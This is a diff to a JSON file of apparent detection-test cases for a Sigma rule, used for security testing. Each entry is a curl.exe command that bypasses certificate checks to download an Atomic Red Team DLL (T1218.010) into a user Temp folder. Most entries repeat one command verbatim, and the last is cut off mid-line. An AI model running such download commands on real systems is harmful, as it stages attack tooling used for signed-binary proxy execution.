@@ -1,6 +1,23 @@
 [
   {
-    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\Public\\Music\\allthethingsx64.dll",
-    "explanation": "This command matches the Sigma rule by using curl.exe to download a file with a suspicious extension (.dll) to a suspicious location (Public\\Music)."
-  }
-]
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\thaim\\AppData\\Local\\Temp\\allthethingsx64.dll",
+    "explanation": "This command is a direct match to the Sigma rule and is already a true positive. No mutation is needed to trigger the rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\thaim\\AppData\\Local\\Temp\\allthethingsx64.dll",
+    "explanation": "Repetition of the same command as a test case for consistency."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\thaim\\AppData\\Local\\Temp\\allthethingsx64.dll",
+    "explanation": "Repetition of the same command as a test case for consistency."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\thaim\\AppData\\Local\\Temp\\allthethingsx64.dll",
+    "explanation": "Repetition of the same command as a test case for consistency."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90e/atomics/T1218.010/bin/AllTheThingsx64.dll -o C:\\Users\\thaim\\AppData\\Local\\Temp\\allthethingsx64.dll",
+    "explanation": "Repetition of the same command as a test case for consistency."
+  },
+  {
+    "output": "C:\\Windows\\System32\\Curl.exe -k https://github.com/redcanaryco/atomic-red-team/raw/058b5c2423c4a6e9e226f4e5ffa1a6fd9bb1a90
